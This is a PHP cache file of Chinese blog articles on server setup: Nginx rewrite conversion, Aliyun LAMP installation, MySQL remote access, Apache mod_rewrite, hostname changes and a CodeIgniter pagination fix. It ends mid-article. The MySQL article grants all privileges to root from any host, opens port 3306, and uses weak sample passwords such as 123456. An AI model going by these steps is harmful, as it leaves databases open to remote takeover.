<?php 
 $arr=array (
  'expiration' => 1442992169,
  'info' => 
  array (
    2015 => 
    array (
      0 => 
      array (
        'article' => 
        array (
          0 => 
          array (
            'id' => '85',
            'uid' => '1',
            'title' => 'PHP网站从Apache转移到Nginx后产生404错误的原因和解决办法',
            'content' => '<p><strong>原案例分析</strong>：</p><p>1、原来的网站在wamp环境下搭建完成，一切正常，上传到虚拟主机环境为lnmp，结果访问时可以打开主页，然后点其他页面全部报404错误；<br/>&nbsp;<br/>2、
经分析得出原因：原网站环境为wamp使用了伪静态，伪静态规则写在网站根目录的.htaccess文件中，Apache下默认识别此文件内容，而
Nginx服务器不识别.htaccess文件，导致伪静态规则无效，自然无法解析url地址，导致404错误（文件不存在）<br/>&nbsp;<br/>3、解决办法：因为Nginx服务器不识别.htaccess文件的，所以原来写在此文件中的伪静态规则需要转移出来，转移方式有两种：</p><p>方法一、如果想保留.htaccess文件，则在linux服务器此目录&nbsp; /usr/local/nginx/conf/rewrite/ 
下建立一个伪静态规则配置文件名字任取，例如：/usr/local/nginx/conf/rewrite/my.conf，将原来
在.htaccess文件中的rewrite规则转换成nginx下的rewrite规则，提供一个自动转换网址<br/>&nbsp;<br/>http://www.anilcetin.com/convert-apache-htaccess-to-nginx/&nbsp; &nbsp; 实测真实有用</p><p><a href=\\"http://www.linuxidc.com/topicnews.aspx?tid=14\\" target=\\"_blank\\" title=\\"CentOS\\">CentOS</a> 6.2实战部署Nginx+MySQL+PHP <a href=\\"http://www.linuxidc.com/Linux/2013-09/90020.htm\\">http://www.linuxidc.com/Linux/2013-09/90020.htm</a></p><p>使用Nginx搭建WEB服务器 <a href=\\"http://www.linuxidc.com/Linux/2013-09/89768.htm\\">http://www.linuxidc.com/Linux/2013-09/89768.htm</a></p><p>搭建基于Linux6.3+Nginx1.2+PHP5+MySQL5.5的Web服务器全过程 <a href=\\"http://www.linuxidc.com/Linux/2013-09/89692.htm\\">http://www.linuxidc.com/Linux/2013-09/89692.htm</a></p><p>CentOS 6.3下Nginx性能调优 <a href=\\"http://www.linuxidc.com/Linux/2013-09/89656.htm\\">http://www.linuxidc.com/Linux/2013-09/89656.htm</a></p><p>CentOS 6.3下配置Nginx加载ngx_pagespeed模块 <a href=\\"http://www.linuxidc.com/Linux/2013-09/89657.htm\\">http://www.linuxidc.com/Linux/2013-09/89657.htm</a></p><p>CentOS 6.4安装配置Nginx+Pcre+php-fpm <a href=\\"http://www.linuxidc.com/Linux/2013-08/88984.htm\\">http://www.linuxidc.com/Linux/2013-08/88984.htm</a></p><p>Nginx搭建视频点播服务器（仿真专业流媒体软件） <a href=\\"http://www.linuxidc.com/Linux/2012-08/69151.htm\\">http://www.linuxidc.com/Linux/2012-08/69151.htm</a><br/><strong>&nbsp;</strong><br/><strong>本案例原规则</strong>：<br/>&nbsp;<br/>&lt;IfModule mod_rewrite.c&gt;<br/>&nbsp;RewriteEngine on<br/>&nbsp;RewriteCond %{REQUEST_FILENAME} !-d<br/>&nbsp;RewriteCond %{REQUEST_FILENAME} !-f<br/>&nbsp;RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]<br/>&nbsp;&lt;/IfModule&gt;<br/><strong>&nbsp;</strong><br/><strong>转换成Nginx后</strong>：<br/>&nbsp;<br/>if (!-d $request_filename){<br/>&nbsp;set $rule_0 1$rule_0;<br/>&nbsp;}<br/>&nbsp;if (!-f $request_filename){<br/>&nbsp;set $rule_0 2$rule_0;<br/>&nbsp;}<br/>&nbsp;if ($rule_0 = &quot;21&quot;){<br/>&nbsp;rewrite ^/(.*)$ /index.php/$1 last;<br/>&nbsp;}</p><p>然后将转换好的规则替换.htaccess文件内容，将.htaccess文件导入my.conf，my.conf内容如下：<br/>&nbsp;<br/>location / {<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; include&nbsp; /home/wwwroot/dijin.com/web/.htaccess;<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>&nbsp;}</p><p>--至此完成伪静态转移</p><p>方法二、如果不想保留.htaccess文件，则前面的步骤照常，最后一步替换的时候直接将转换好的内容放入my.conf文件中，如下：<br/>&nbsp;<br/>location / {<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (!-d $request_filename){<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set $rule_0 1$rule_0;<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (!-f $request_filename){<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set $rule_0 2$rule_0;<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($rule_0 = &quot;21&quot;){<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;rewrite ^/(.*)$ /index.php/$1 last;<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>&nbsp; }</p><p>--至此完成</p><p><br/></p><p>转自：http://www.linuxidc.com/Linux/2014-06/103103.htm</p>',
            'keyword' => 'PHP,Apache,Nginx,404',
            'sortid' => '5',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 17:54:48',
          ),
          1 => 
          array (
            'id' => '84',
            'uid' => '1',
            'title' => '阿里云服务器搭建与问题',
            'content' => '<p class=\\"MsoListParagraph\\" style=\\"margin-left:28px\\">一、<span style=\\"font-family: 宋体\\">服务器选择</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:56px\\"><span style=\\"font-size:12px\\">a)<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style=\\"font-size:12px;font-family:宋体\\">因为最近在搞域名就多关注了一下阿里云，发现有可以试用的服务器，于是打算申请一个免费服务器，</span><span style=\\"font-size:12px\\">15</span><span style=\\"font-size:12px;font-family:宋体\\">天的，因为自己也正打算买呢，所以打算一探究竟。</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:56px\\"><span style=\\"font-size:12px\\">b)<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style=\\"font-size:12px;font-family:宋体\\">前期就是服务器的购买啊，设置等等；全部弄完以后，阿里云会给你发一封邮件，包括</span><span style=\\"font-size:12px\\">IP</span><span style=\\"font-size:12px;font-family:宋体\\">地址等等信息；</span><span style=\\"font-size:12px\\">OK</span><span style=\\"font-size:12px;font-family:宋体\\">，下面我们就可以进入了；</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:28px\\"><span style=\\"font-size:12px\\">二、<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp; </span></span><span style=\\"font-size:12px;font-family:宋体\\">环境配置</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:56px\\"><span style=\\"font-size:12px\\">a)<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style=\\"font-size:12px;font-family:宋体\\">系统选择：最终还是选择</span><span style=\\"font-size:12px\\">CentOS</span><span style=\\"font-size:12px;font-family: 宋体\\">，原因就是因为以前用过，比较熟悉；</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:56px\\"><span style=\\"font-size:12px\\">b)<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style=\\"font-size:12px;font-family:宋体\\">下面就是磁盘的挂载了，也可以选择不挂载，那样系统会在一键安装时，给你默认挂载磁盘；</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:56px\\"><span style=\\"font-size:12px\\">c)<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style=\\"font-size:12px;font-family:宋体\\">环境搭建：因为我本地的</span><span style=\\"font-size:12px\\">test</span><span style=\\"font-size:12px;font-family: 宋体\\">环境就是</span><span style=\\"font-size: 12px\\">apache+mysql+php</span><span style=\\"font-size:12px;font-family:宋体\\">的，所以决定选择</span><span style=\\"font-size:12px\\">LAMP</span><span style=\\"font-size:12px;font-family: 宋体\\">；</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:108px\\"><span style=\\"font-size:12px\\">1、<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp;&nbsp; </span></span><span style=\\"font-size:12px;font-family:宋体\\">第一步：下载阿里云</span><span style=\\"font-size:12px\\">LAMP</span><span style=\\"font-size:12px;font-family: 宋体\\">一键安装包：访问：</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:108px;text-indent:0\\"><a href=\\"http://help.aliyun.com/knowledge_list/8314854.html?spm=5176.788314854.1863381.485.UOR7wv\\"><span style=\\"font-size:12px\\">http://help.aliyun.com/knowledge_list/8314854.html?spm=5176.788314854.1863381.485.UOR7wv</span></a><span style=\\"font-size:12px\\">&nbsp; </span><span style=\\"font-size:12px;font-family:宋体\\">选择</span><span style=\\"font-size:12px\\"> Linux</span><span style=\\"font-size:12px;font-family:宋体\\">一键安装</span><span style=\\"font-size:12px\\">web</span><span style=\\"font-size:12px;font-family: 宋体\\">环境全攻略，点击一键下载；</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:108px\\"><span style=\\"font-size:12px\\">2、<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp;&nbsp; </span></span><span style=\\"font-size:12px;font-family:宋体\\">下载后，是用</span><span style=\\"font-size:12px\\">ftp</span><span style=\\"font-size:12px;font-family: 宋体\\">软件（随便），上传到服务器下的</span><span style=\\"font-size:12px\\">home/</span><span style=\\"font-size:12px;font-family: 宋体\\">下；然后就是执行</span><span style=\\"font-size:12px\\">apache/nginx</span><span style=\\"font-size:12px;font-family:宋体\\">、</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:112px;text-indent:0\\"><span style=\\"font-size:12px\\">mysql</span><span style=\\"font-size: 12px;font-family:宋体\\">、</span><span style=\\"font-size:12px\\">php</span><span style=\\"font-size:12px;font-family: 宋体\\">等安装；详细说明在一键安装包里的两个</span><span style=\\"font-size:12px\\">PDF</span><span style=\\"font-size:12px;font-family: 宋体\\">文档里面都有；</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:56px\\"><span style=\\"font-size:12px\\">d)<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style=\\"font-size:12px;font-family:宋体\\">环境搭建：手动搭建，就是不使用一键安装包，而是逐个安装：参考：</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:28px\\"><a href=\\"http://bbs.aliyun.com/read.php?spm=5176.775973948.2.6.S91WUp&tid=130069\\"><span style=\\"font-size:12px\\">http://bbs.aliyun.com/read.php?spm=5176.775973948.2.6.S91WUp&amp;tid=130069</span></a> </p><p class=\\"MsoListParagraph\\" style=\\"margin-left:28px\\"><span style=\\"font-size:12px\\">三、<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp; </span></span><span style=\\"font-size:12px;font-family:宋体\\">一些问题</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:56px\\"><span style=\\"font-size:12px\\">a)<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style=\\"font-size:12px;font-family:宋体\\">修改</span><span style=\\"font-size: 12px\\">root</span><span style=\\"font-size:12px;font-family:宋体\\">密码：</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:84px;text-indent:0\\"><a href=\\"http://bbs.aliyun.com/read/171244.html?page=e\\"><span style=\\"font-size:12px\\">http://bbs.aliyun.com/read/171244.html?page=e</span></a> </p><p class=\\"MsoListParagraph\\" style=\\"margin-left:56px\\"><span style=\\"font-size:12px\\">b)<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style=\\"font-size:12px;font-family:宋体\\">修改</span><span style=\\"font-size: 12px\\">hostname</span><span style=\\"font-size:12px;font-family:宋体\\">：</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:84px;text-indent:0\\"><a href=\\"http://www.itbulu.com/aliyun-hostname.html\\"><span style=\\"font-size:12px\\">http://www.itbulu.com/aliyun-hostname.html</span></a> </p><p class=\\"MsoListParagraph\\" style=\\"margin-left:56px\\"><span style=\\"font-size:12px\\">c)<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style=\\"font-size:12px\\">Phpmyadmin</span><span style=\\"font-size:12px;font-family:宋体\\">提示：您应该升级更高版本</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:84px;text-indent:0\\"><a href=\\"http://wxlccsu.com/archives/914\\"><span style=\\"font-size:12px\\">http://wxlccsu.com/archives/914</span></a> </p><p class=\\"MsoListParagraph\\" style=\\"margin-left:56px\\"><span style=\\"font-size:12px\\">d)<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style=\\"font-size:12px;font-family:宋体\\">设置</span><span style=\\"font-size: 12px\\">mysql</span><span style=\\"font-size:12px;font-family:宋体\\">支持远程链接</span></p><p class=\\"MsoListParagraph\\" style=\\"margin-left:84px;text-indent:0\\"><a href=\\"http://www.ainiu.net/AiNiuNetwork27-296.htm\\"><span style=\\"font-size:12px\\">http://www.ainiu.net/AiNiuNetwork27-296.htm</span></a> </p><p class=\\"MsoListParagraph\\" style=\\"margin-left:56px\\"><span style=\\"font-size:12px\\">e)<span style=\\"font:9px &#39;Times New Roman&#39;\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style=\\"font-size:12px\\">Apache</span><span style=\\"font-size:12px;font-family:宋体\\">转义到</span><span style=\\"font-size:12px\\"> nginx </span><span style=\\"font-size:12px;font-family:宋体\\">后</span><span style=\\"font-size:12px\\">404</span><span style=\\"font-size:12px;font-family: 宋体\\">的问题：</span></p><p style=\\"margin-left:84px\\"><a href=\\"http://www.linuxidc.com/Linux/2014-06/103103.htm\\"><span style=\\"font-size: 12px\\">http://www.linuxidc.com/Linux/2014-06/103103.htm</span></a> </p><p><br/></p>',
            'keyword' => '阿里云,服务器',
            'sortid' => '5',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 17:53:51',
          ),
          2 => 
          array (
            'id' => '83',
            'uid' => '1',
            'title' => '阿里云服务器Linux环境下设置mysql支持远程连接数据库',
            'content' => '<p>一是：改表法（这个方法我没有试）<br/>因为在linux环境下，默认是关闭3306端口远程连接的，需要开启，这个后面说！<br/>可能是你的帐号不允许从远程登陆，只能在localhost。这个时候只要在localhost的那台电脑，登入mysql后，更改 &quot;mysql&quot; 数据库 里的 &quot;user&quot;（远程数据库的名称） 表里的 &quot;host&quot; 项，从&quot;localhost&quot;改称&quot;%&quot; &nbsp;&nbsp;<br/>mysql -u root -pvmwaremysql&gt;use mysql; &nbsp;&nbsp;<br/>mysql&gt;update user set host = ’%’ where user = ’root’; &nbsp;&nbsp;<br/>mysql&gt;select host, user from user; &nbsp;&nbsp;<br/><br/>二是：授权法<br/>例如，你想myuser（远程连接的用户名）使用mypassword（远程连接的密码）从任何主机连接到mysql服务器的话。 &nbsp;&nbsp;<br/>GRANT ALL PRIVILEGES ON *.* TO ’myuser’@’%’IDENTIFIED BY ’mypassword’ WI &nbsp;&nbsp;<br/>TH GRANT OPTION; &nbsp;&nbsp;<br/>如果你想允许用户myuser（远程连接的用户名）从ip为192.168.1.6（你测试电脑上的IP）的主机连接到mysql服务器，并使用 mypassword（远程连接的密码）作为密码 &nbsp;&nbsp;<br/>GRANT ALL PRIVILEGES ON *.* TO ’myuser’@’192.168.1.6’IDENTIFIED BY &nbsp;&nbsp;<br/>’mypassword’ WITH GRANT OPTION; &nbsp;&nbsp;<br/>开始用的第一个方法,刚开始发现不行,在网上查了一下,少执行一个语句 mysql&gt;FLUSH RIVILEGES使修改生效，就可以了。 &nbsp;&nbsp;<br/>方法是在安装mysql的机器上运行： &nbsp;&nbsp;<br/>1、d:\\\\mysql\\\\bin\\\\&gt;mysql -h localhost -u root &nbsp; //这样应该可以进入MySQL服务器 &nbsp;&nbsp;<br/>2、mysql&gt;GRANT ALL PRIVILEGES ON *.* TO ’root’@’%’WITH GRANT OPTION &nbsp;&nbsp;<br/>//赋予任何主机访问数据的权限 &nbsp;&nbsp;<br/>3、mysql&gt;FLUSH PRIVILEGES &nbsp; //修改生效 &nbsp;&nbsp;<br/>4、mysql&gt;EXIT &nbsp; //退出MySQL服务器 &nbsp;<br/>这个时候还没结束呢，一般的服务器上安装的都有防火墙之类的东西，也需要我们开启3306端口才能用了<br/>在linux下要开启防火墙 打开3306 端口，编辑这个文件vim /etc/sysconfig/iptables<br/>输入<br/>-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT<br/>保存后在控制台输入 /etc/rc.d/init.d/iptables restart &nbsp;重启防火墙，记得一定要重启哦，我就是因为没有重启防火墙导致一直连接不上，最后终于找到答案了<br/><br/>快速让MySQL数据库服务器支持远程连接<br/><br/><br/>在CentOS上安装MySQL数据库服务器后，系统出于安全性考虑，缺省不支持用户通过非本机连接上数据库服务器，如果想让用户通过另外一台机器连接上数据库服务器必须手动进行修改：<br/><br/>1、在控制台执行 mysql -u root -p mysql，系统提示输入数据库root用户的密码，输入完成后即进入mysql控制台，这个命令的第一个mysql是执行命令，第二个mysql是系统数据名称，不一样的。<br/><br/>2、在mysql控制台执行 GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;MyPassword&#39; WITH GRANT OPTION;<br/><br/>3、 在mysql控制台执行命令中的 &#39;root&#39;@&#39;%&#39; 可以这样理解: 
root是用户名，%是主机名或IP地址，这里的%代表任意主机或IP地址，你也可替换成任意其它用户名或指定唯一的IP地址；&#39;MyPassword&#39;
 是给授权用户指定的登录数据库的密码；另外需要说明一点的是我这里的都是授权所有权限，可以指定部分权限<br/><br/>4、不放心的话可以在mysql控制台执行 select host, user from user; 检查一下用户表里的内容<br/><br/><br/>打开MySQL远程访问权限<br/><br/>1.以 root 帐户登陆 MySQL&nbsp;<br/><br/>MySQL -uroot -p123456&nbsp;<br/><br/>注：123456 为 root 用户的密码。<br/><br/>2.创建远程登陆用户并授权<br/><br/>grant all PRIVILEGES on discuz.* to ted@&#39;123.123.123.123&#39; identified by &#39;123456&#39;;&nbsp;<br/><br/>注：上面的语句表示将 discuz 数据库的所有权限授权给 ted 这个用户，允许 ted 用户在 123.123.123.123 这个 IP 进行远程登陆，并设置 ted 用户的密码为 123456 。<br/><br/>----------------<br/><br/>改表法&nbsp;<br/><br/>可能是你的帐号不允许从远程登陆，只能在localhost。这个时候只要在localhost的那台电脑，登入mysql后，更改 &quot;mysql&quot; 数据库里的 &quot;user&quot; 表里的 &quot;host&quot; 项，从&quot;localhost&quot;改称&quot;%&quot;&nbsp;<br/><br/>mysql -u root -p&nbsp;<br/><br/>mysql&gt;use mysql;&nbsp;<br/><br/>mysql&gt;update user set host = &#39;%&#39; where user = &#39;root&#39;;&nbsp;<br/><br/>mysql&gt;select host, user from user;</p>',
            'keyword' => '阿里云,服务器,Linux,mysql,远程,连接数据库',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 17:52:56',
          ),
          3 => 
          array (
            'id' => '82',
            'uid' => '1',
            'title' => 'linux中提示The requested URL *** was not found on this server',
            'content' => '<p>本文章来给大家介绍关于在使用linux中提示The requested URL *** was not found on this server错误解决办法，有需要了解的朋友可进入参考。</p><p>因为之前别人在服务器上装了<a href=\\"http://www.111cn.net/list-195/\\" target=\\"_blank\\">nginx</a>,我装了<a href=\\"http://www.111cn.net/list-121/\\" target=\\"_blank\\">apache</a>后，访问出现The <a href=\\"http://www.111cn.net/tags.php/request/\\" target=\\"_blank\\">request</a>ed URL *** was not found on this server，查看了下/etc/httpd/conf/httpd.conf,发现原因：</p><p>DocumentRoot指向错误，于是修改之，另外确保你的apache开启了rewrite_module模块</p><p>Apache的rewrite_module模块，支持.htaccess</p><p><br/><strong>rewrite_module没开启，开启过程如下：</strong></p><p>centos的配置文件放在：</p><table style=\\"background:#FB7\\" align=\\"center\\" border=\\"0\\" cellpadding=\\"1\\" cellspacing=\\"1\\" width=\\"620\\">
	<tbody><tr>
		<td height=\\"27\\" bgcolor=\\"#FFE7CE\\" width=\\"464\\">&nbsp;代码如下</td>
		<td style=\\"cursor:pointer;\\" align=\\"center\\" bgcolor=\\"#FFE7CE\\" width=\\"109\\">复制代码</td>
	</tr>
	<tr>
		<td colspan=\\"2\\" style=\\"padding:10px;\\" class=\\"copyclass\\" id=\\"copy7251\\" height=\\"auto\\" bgcolor=\\"#FFFFFF\\" valign=\\"top\\">/etc/httpd/conf/httpd.conf</td>
	</tr>
	</tbody></table><p>打开文件找到：</p><table style=\\"background:#FB7\\" align=\\"center\\" border=\\"0\\" cellpadding=\\"1\\" cellspacing=\\"1\\" width=\\"620\\">
	<tbody><tr>
		<td height=\\"27\\" bgcolor=\\"#FFE7CE\\" width=\\"464\\">&nbsp;代码如下</td>
		<td style=\\"cursor:pointer;\\" align=\\"center\\" bgcolor=\\"#FFE7CE\\" width=\\"109\\">复制代码</td>
	</tr>
	<tr>
		<td colspan=\\"2\\" style=\\"padding:10px;\\" class=\\"copyclass\\" id=\\"copy8227\\" height=\\"auto\\" bgcolor=\\"#FFFFFF\\" valign=\\"top\\"><p>LoadModule rewrite_module modules/mod_rewrite.so</p></td>
	</tr>
	</tbody></table><p>将前面&quot;#&quot;去掉，如果不存在则添加上句。</p><p>如果你的网站是根目录的话：找到</p><table style=\\"background:#FB7\\" align=\\"center\\" border=\\"0\\" cellpadding=\\"1\\" cellspacing=\\"1\\" width=\\"620\\">
	<tbody><tr>
		<td height=\\"27\\" bgcolor=\\"#FFE7CE\\" width=\\"464\\">&nbsp;代码如下</td>
		<td style=\\"cursor:pointer;\\" align=\\"center\\" bgcolor=\\"#FFE7CE\\" width=\\"109\\">复制代码</td>
	</tr>
	<tr>
		<td colspan=\\"2\\" style=\\"padding:10px;\\" class=\\"copyclass\\" id=\\"copy3827\\" height=\\"auto\\" bgcolor=\\"#FFFFFF\\" valign=\\"top\\"><p>&lt;Directory /&gt;<br/>&nbsp; Options FollowSymLinks<br/>&nbsp; AllowOverride None&nbsp; <br/>&lt;/Directory&gt;</p></td>
	</tr>
	</tbody></table><p>将上面的<span style=\\"color:#ff0000\\">None改为All</span></p><p>如果你的站点不在根目录，设置如下：</p><table style=\\"background:#FB7\\" align=\\"center\\" border=\\"0\\" cellpadding=\\"1\\" cellspacing=\\"1\\" width=\\"620\\">
	<tbody><tr>
		<td height=\\"27\\" bgcolor=\\"#FFE7CE\\" width=\\"464\\">&nbsp;代码如下</td>
		<td style=\\"cursor:pointer;\\" align=\\"center\\" bgcolor=\\"#FFE7CE\\" width=\\"109\\">复制代码</td>
	</tr>
	<tr>
		<td colspan=\\"2\\" style=\\"padding:10px;\\" class=\\"copyclass\\" id=\\"copy1013\\" height=\\"auto\\" bgcolor=\\"#FFFFFF\\" valign=\\"top\\"><p>&lt;Directory &quot;/var/www/html/my_directory&quot;&gt;&nbsp;</p><p>Order allow,deny<br/>Allow from all<br/>AllowOverride All<br/>&lt;/Directory&gt;</p></td>
	</tr>
	</tbody></table><p>OK，然后重启服务器，service httpd restart ,这样.htaccess就可以使用了</p><p><br/></p>',
            'keyword' => 'linux',
            'sortid' => '5',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 17:51:59',
          ),
          4 => 
          array (
            'id' => '81',
            'uid' => '1',
            'title' => '阿里云服务器Linux环境永久修改主机用户名方法',
            'content' => '<p>最近入手阿里云服务器，一来体验国内优秀的云主机产品，二来准备较为全面的分享阿里云服务器基础应用，把常用的教程分享出来供新手用户参考使用。对
于Windows系统基本没有多少可以分享的，我们可以直接IIS建站也可以用很多网上的服务器安装包就可以搭建网站环境，我们使用较多的以及比较生疏的
还是Linux系统环境。</p><p>在登陆SSH之后，我们可能会看到比较难看的主机名，很多人和老蒋一样比较讲究细节。</p><p><img data-tag=\\"bdshare\\" class=\\"alignnone size-full wp-image-1098\\" src=\\"http://www.itbulu.com/wp-content/uploads/2014/12/aliyun-name-1.jpg\\" alt=\\"阿里云服务器默认主机名\\" height=\\"329\\" width=\\"482\\"/></p><p>我们可以看到默认的阿里云服务器主机名很乱，我们希望设置自己的主机名。</p><p>第一步、编辑/etc/hosts文件</p><p>通过vi /etc/hosts打开修改主机名</p><p><img data-tag=\\"bdshare\\" class=\\"alignnone size-full wp-image-1099\\" src=\\"http://www.itbulu.com/wp-content/uploads/2014/12/aliyun-name-2.jpg\\" alt=\\"aliyun-name-2\\" height=\\"130\\" width=\\"457\\"/></p><p>第二步、编辑/etc/sysconfig/network文件</p><p><img data-tag=\\"bdshare\\" class=\\"alignnone size-full wp-image-1100\\" src=\\"http://www.itbulu.com/wp-content/uploads/2014/12/aliyun-name-3.jpg\\" alt=\\"aliyun-name-3\\" height=\\"166\\" width=\\"481\\"/></p><p>第三步、<a href=\\"http://www.itbulu.com/tag/hostname/\\" title=\\"View all posts in Hostname\\" target=\\"_blank\\" class=\\"tag_link\\">Hostname</a>设置</p><blockquote><p>hostname itbulu</p></blockquote><p>最后在设置新的主机名，这样起到双重保险，因为很多时候没有执行这几个步骤，会重启VPS之后，又还原成原来的主机名。</p><p>最后，我们reboot重启VPS之后，就可以看到新的主机名生效。</p><p><br/></p>',
            'keyword' => '阿里云,服务器,Linux,主机用户名',
            'sortid' => '5',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 17:51:07',
          ),
          5 => 
          array (
            'id' => '80',
            'uid' => '1',
            'title' => 'CI设置伪静态对分页类不适用及分页类链接不完整的解决',
            'content' => '<p>在CI框架使用伪静态时，某些情况下伪静态并不适用。CI框架在包含多页链接时候如果使用伪静态就会在链接地址尾部加上事先自定义的后缀（例.html）。</p><p>但是在某些最后一个参数当使用命令为一个数字时候。控制器将会把.html一并接收，从而使接下来的执行出现异常。</p><p><span id=\\"more-37\\"></span></p><p>操作之前我们需要定义下伪静态后缀：</p><p>找到<strong>./application/config/config.php</strong>文件60行附近设置：</p><pre>$config[&#39;url_suffix&#39;]&nbsp;=&nbsp;&#39;.html&#39;;</pre><p><strong>解决方案开始</strong>：</p><p>找到<strong> ./system/core/URI.php</strong>文件280行附近_remove_url_suffix 函数可添加：</p><pre>$this-&gt;uri_string&nbsp;=&nbsp;str_replace($this-&gt;config-&gt;item(&#39;url_suffix&#39;),&nbsp;&#39;&#39;,&nbsp;$this-&gt;uri_string);</pre><pre>更新CI3.0&nbsp;在154行之后添加此句。</pre><p>此举可以在接收地址栏参数时候排除自定义的后缀名，解决隐患。</p><p>接着，在分页类使用过程中，以下某种情况将会出现：<br/>当配置参数$config[‘base_url’] 使用 site_url()点击非首页时候：</p><pre>http://127.0.0.1/article/list/1.html/10</pre><p>当配置参数$config[‘base_url’] 使用 base_url()点击首页时候根本没见到自定义的后缀好吗，亦或者这样：</p><pre>http://127.0.0.1/article/list/1/.html</pre><p>这个地址看起来太糟糕了有木有，所以我们将会把系统库的页面配置进行修改,在<strong>./system/libraries/Pagination.php</strong> 文件中225行附近$output=”;后添加</p><pre>$this-&gt;suffix&nbsp;=&nbsp;$CI-&gt;config-&gt;item(&#39;url_suffix&#39;);
